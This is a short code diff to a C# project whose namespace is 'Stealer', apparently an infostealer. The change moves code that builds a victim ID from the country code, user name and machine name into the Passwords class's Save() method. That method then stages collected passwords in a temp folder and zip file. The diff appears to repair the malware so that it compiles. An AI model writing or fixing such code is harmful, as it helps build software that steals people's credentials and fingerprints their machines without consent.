@@ -8,8 +8,7 @@ using System.Collections.Generic;
 using System.Windows.Forms;
 using System.Text.RegularExpressions;
 using System.Globalization;
-
-
+using System.Linq;
 
 namespace Stealer
 {
@@ -1071,16 +1070,8 @@ namespace Stealer
 	    internal sealed class Passwords
     {
 	
-		    var regions = CultureInfo.GetCultures(CultureTypes.SpecificCultures).Select(x => new RegionInfo(x.LCID));
-                var englishRegion = regions.FirstOrDefault(region => region.EnglishName.Contains(RegionInfo.CurrentRegion.EnglishName));
-                string countryAbbrev = englishRegion.TwoLetterISORegionName;	
-			
-string compid=countryAbbrev+(Environment.UserName)+(Environment.MachineName);
-string id = Regex.Replace(compid, "[^a-zA-Z0-9]", "").ToLower();
-		    
-static string ziplog = Path.Combine(Path.GetTempPath(), id + ".zip" );
 
-		 private static string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),id );
+	//	 private static string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),id );
 		
 		 
 		 			
@@ -1303,8 +1294,18 @@ public static void DeleteDirectory(string target_dir)
 
         public static string Save()
         {
-			
-			if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
+
+            var regions = CultureInfo.GetCultures(CultureTypes.SpecificCultures).Select(x => new RegionInfo(x.LCID));
+            var englishRegion = regions.FirstOrDefault(region => region.EnglishName.Contains(RegionInfo.CurrentRegion.EnglishName));
+            string countryAbbrev = englishRegion.TwoLetterISORegionName;
+
+            string compid = countryAbbrev + (Environment.UserName) + (Environment.MachineName);
+            string id = Regex.Replace(compid, "[^a-zA-Z0-9]", "").ToLower();
+            string ziplog = Path.Combine(Path.GetTempPath(), id + ".zip");
+            string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(), id);
+
+
+            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
       
 		  if (Report.CreateReport(PasswordsStoreDirectory))
 			{	
